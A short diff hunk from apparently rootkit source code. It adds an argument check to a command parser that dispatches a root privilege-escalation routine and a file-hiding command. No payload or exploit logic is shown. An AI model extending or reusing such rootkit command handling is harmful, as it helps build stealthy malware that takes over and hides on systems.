@@ -59,6 +59,7 @@ int satan_command_parse(const char *s)
         // 1. `cmd` points to the command string.
         // 2. `arg` points to the argument string.
         if (!strncmp(cmd, CMD_PRIVESC, CMD_SIZE)) {
+                DIE_IF_NO_ARG(arg);
                 satan_privesc_root(arg);
 
         } else if (!strncmp(cmd, CMD_FILE_HIDE, CMD_SIZE)) {
